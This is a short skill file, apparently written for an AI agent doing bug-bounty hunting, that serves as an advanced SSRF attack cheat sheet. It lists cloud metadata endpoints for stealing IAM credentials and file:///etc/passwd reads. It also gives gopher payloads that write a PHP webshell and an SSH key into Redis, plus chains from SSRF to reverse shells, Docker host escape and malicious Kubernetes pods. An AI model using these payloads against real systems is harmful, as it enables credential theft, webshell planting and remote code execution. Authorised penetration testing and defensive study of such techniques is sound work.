---
name: hunt-ssrf-advanced
description: Advanced SSRF — cloud metadata, DNS rebinding, protocol smuggling (gopher/dict/file), URL parser differentials, SSRF-to-RCE chains.
---

# ADVANCED SSRF — 3 BULLETS MAX

**Core:** SSRF chains from Low to Critical: DNS callback → internal → cloud creds → RCE.

## CLOUD METADATA
```
AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS IMDSv2: PUT token first, then use in header
GCP: http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google)
Azure: http://169.254.169.254/metadata/instance (Header: Metadata: true)
```

## PROTOCOL SMUGGLING
```
gopher://127.0.0.1:6379/_SET%20shell%20%3C?php%20system($_GET['cmd'])?%3E (Redis write webshell)
gopher://127.0.0.1:6379/_SET%20sshkey%20\nssh-rsa AAAA... (Redis write SSH key)
dict://127.0.0.1:6379/INFO (Redis info)
file:///etc/passwd (local file read)
```

## SSRF→RCE CHAINS
```
SSRF → Redis (gopher) → write cron → reverse shell → RCE
SSRF → Docker API → privileged container → host escape
SSRF → K8s API → deploy malicious pod → RCE
SSRF → Jenkins script console → RCE
SSRF → FastCGI → PHP code execution
SSRF → Prometheus → target discovery → further exploitation
```

## BLIND DETECTION
```
OOB: curl https://target.com/fetch?url=http://UNIQUE.xxxx.oast.fun
Timing: compare response times for open vs closed ports
DNS: check DNS logs for query from target IP
```
